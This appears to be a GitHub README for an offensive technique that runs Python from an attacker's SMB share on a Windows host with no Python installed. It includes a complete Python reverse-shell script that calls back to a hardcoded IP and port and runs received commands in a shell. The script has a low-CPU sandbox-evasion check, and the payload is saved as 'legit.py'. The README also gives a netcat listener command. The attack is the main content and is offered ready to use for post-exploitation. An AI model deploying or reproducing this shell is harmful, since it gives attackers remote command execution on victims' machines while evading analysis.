# Eazee-As-Py
## Execute Python Reverse Shells on Windows Hosts without Python Installed 😎

I spent this morning working out how I can execute Python on a Windows Host that doesnt have Python Installed.

There is no documentation I have found online on this particular technique so I am taking all the credit 💪🏼

Obviously using SMB shares for transferring files and running .exe is nothing new but this way we can load python into memory on a system that doesnt have Python installed. Also nothing touches disk. 

Essentially this is giving us more flexibility to execute Reverse Shells and carry out Post-Exploitation task if needed. For example see this on exposing an Internal HTTP Server using this technique with no SSH port forwarding - https://github.com/deeexcee-io/LOI-Bins#port-forward-example

Im assuming the possibilites are endless with this.

Not exactly ground breaking research just some abstract thinking whilst lying in bed at 1am. 🛌🏼

## EDIT

This random example has spawned more testing. see - https://github.com/deeexcee-io/LOI-Bins

## How to do it

* Have a Windows Attack Machine alongside Kali (you could do all this on windows btw, just install ncat https://nmap.org/download ) 🐱
* Download and install Python on Windows Attack Machine, ensure to tick add PYTHON to PATH on install 🐍
* Navigate to Install Folder - Mine is C:\Users\<USERNAME>\AppData\Local\Programs\Python\Python310
* Right click on Python310 Folder and Share it
* Go on advanced Sharng and give it a share name, I kept it as Python310
![image](https://user-images.githubusercontent.com/130473605/234895545-22794caf-0b53-4578-8d0e-c3452209c29f.png)
* Get a Windows Specific Python Reverse Shell, most of what I found on GitHub was the Client/Server.py files but they should be good or use this.
```python
import os
import socket
import subprocess


if os.cpu_count() <= 2:
    quit()

HOST = '192.168.0.169'
PORT = 4445

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))


while 1:
    try:
        s.send(str.encode(os.getcwd() + "> "))
        data = s.recv(1024).decode("UTF-8")
        data = data.strip('\n')
        if data == "quit": 
            break
        if data[:2] == "cd":
            os.chdir(data[3:])
        if len(data) > 0:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
            stdout_value = proc.stdout.read() + proc.stderr.read()
            output_str = str(stdout_value, "UTF-8")
            s.send(str.encode("\n" + output_str))
    except Exception as e:
        continue
    
s.close()
```

* Save it in the same Folder - I named it legit.py

![image](https://user-images.githubusercontent.com/130473605/234902955-91f4113a-85ca-41ec-a134-d76242612491.png)

* Setup nc to catch shell on Kali `nc -lvnp <port>`
* On Windows Host in CMD point to python.exe on remote share and pass it the reverse shell name also hosted on remote share

![image](https://user-images.githubusercontent.com/130473605/234904613-8f8f530f-1568-4ff1-b614-f1dd55423beb.png)

* Enjoy your Python Reverse Shell from a Windows Host that doesnt have Python installed

![image](https://user-images.githubusercontent.com/130473605/234906073-576c9241-4c1f-4296-8fd0-6b1e233baf92.png)




